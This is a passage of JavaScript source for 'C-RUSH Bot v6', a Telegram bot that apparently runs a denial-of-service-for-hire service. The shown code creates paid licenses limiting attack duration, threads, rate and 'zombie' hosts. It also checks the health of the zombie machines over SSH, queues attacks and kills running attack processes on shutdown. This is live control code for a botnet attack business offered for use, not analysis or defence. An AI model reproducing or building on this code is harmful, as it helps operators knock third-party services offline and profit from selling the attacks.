        const v = data === 'tier_z_all' ? -1 : parseInt(data.replace('tier_z_', ''));
        st.data.maxZombies = v;

        const key = genLicenseKey();
        licenses[key] = {
            key,
            durationDays:      st.data.days,
            maxUses:           st.data.uses,
            dailyLimit:        st.data.dailyLimit,
            cooldownSeconds:   st.data.cooldownSeconds,
            maxConcurrent:     st.data.maxConcurrent,
            maxAttackDuration: st.data.maxAttackDuration,
            maxThreads:        st.data.maxThreads,
            maxRate:           st.data.maxRate,
            maxZombies:        v,
            usedCount: 0, usedBy: [],
            createdAt: now(), expiresAt: now() + 365 * DAY,
            createdBy: userId,
        };
        saveJSON(FILES.licenses, licenses);
        stats.totalLicenses = (stats.totalLicenses || 0) + 1;
        saveJSON(FILES.stats, stats);
        userState.delete(chatId);

        return edit(
            `✅ *License created*\n\n🔑 \`${key}\`\n\n` +
            `📅 ${st.data.days}d | 👥 ${st.data.uses === 9999 ? '∞' : st.data.uses}\n` +
            `📊 ${st.data.dailyLimit}/day | ⏳ ${st.data.cooldownSeconds}s | 🧵 ${st.data.maxConcurrent}\n` +
            `⏱ ${st.data.maxAttackDuration}s | ⚡ ${st.data.maxThreads}t | 🚀 ${st.data.maxRate}r\n` +
            `🧟 Zombies: ${v === -1 ? 'all' : v}`,
            adminMenuKeyboard());
    }
});

// =============================================================
//  ZOMBIE HEALTH CHECK
// =============================================================
setInterval(async () => {
    if (!zombies.length) return;
    for (const z of zombies) {
        try {
            const conn = await sshConnect(z, 8000);
            const r = await sshExec(conn, 'command -v node && node -v');
            conn.end();
            if (r.code === 0 && r.stdout.includes('v')) {
                z.status = 'online';
                z.nodeVersion = r.stdout.trim().split('\n').pop();
            } else { z.status = 'offline'; }
        } catch { z.status = 'offline'; }
        z.lastCheck = now();
    }
    saveJSON(FILES.zombies, zombies);
}, CONFIG.ZOMBIE_CHECK_INTERVAL);

// =============================================================
//  🆕 QUEUE TICK — فقط وقتی صف قفل نیست و اتک فعال نیست
// =============================================================
setInterval(() => {
    if (attackQueue.length === 0) return;
    if (now() < queueLockedUntil) return;
    if (activeAttacks.size >= CONFIG.MAX_CONCURRENT_ATTACKS) return;
    drainQueue();
}, 3000);

// =============================================================
//  SHUTDOWN
// =============================================================
function shutdown(sig) {
    console.log(`\n[${sig}] Shutdown…`);
    for (const a of activeAttacks.values()) {
        try {
            if (a.type === 'zombie' && a.children) {
                for (const c of a.children) { try { c.stream.signal('KILL'); } catch {} try { c.conn.end(); } catch {} }
            } else if (a.proc) { a.proc.kill('SIGKILL'); }
        } catch {}
    }
    process.exit(0);
}
process.on('SIGINT', () => shutdown('SIGINT'));
process.on('SIGTERM', () => shutdown('SIGTERM'));

// =============================================================
//  BOOT
// =============================================================
bot.sendMessage(CONFIG.OWNER_ID,
    `✅ *C-RUSH Bot Online (v6 — Serial Queue)*\n\n` +
    `🧟 Zombies: ${activeZombies().length}/${zombies.length} online\n` +
    `⛔ Blacklist: ${blacklist.length} patterns\n` +
    `📢 Force-join: ${loadJSON(FILES.channels, []).length}\n` +
    `👥 Users: ${Object.keys(users).length} | 🔑 Licenses: ${Object.keys(licenses).length}\n` +
    `⚡ Mode: *Serial* (1 active attack)\n` +
    `⏱ Gap: ${CONFIG.QUEUE_GAP_MS/1000}s\n` +
    `💾 RAM: ${freeMemMB()}MB free`,
    { parse_mode: 'Markdown' }
).catch(() => {});

process.on('uncaughtException',  e => console.error('[uncaught]', e.message));
process.on('unhandledRejection', e => console.error('[rejection]', (e && e.message) || e));

console.log('⚡ C-RUSH Bot v6 started. Owner:', CONFIG.OWNER_ID);
console.log('   Zombies:', activeZombies().length + '/' + zombies.length, 'online');
console.log('   Blacklist:', blacklist.length, 'patterns');
console.log('   Mode: SERIAL (1 active attack globally)');
console.log('   Queue gap:', CONFIG.QUEUE_GAP_MS / 1000, 's');
console.log('   Free RAM:', freeMemMB(), 'MB');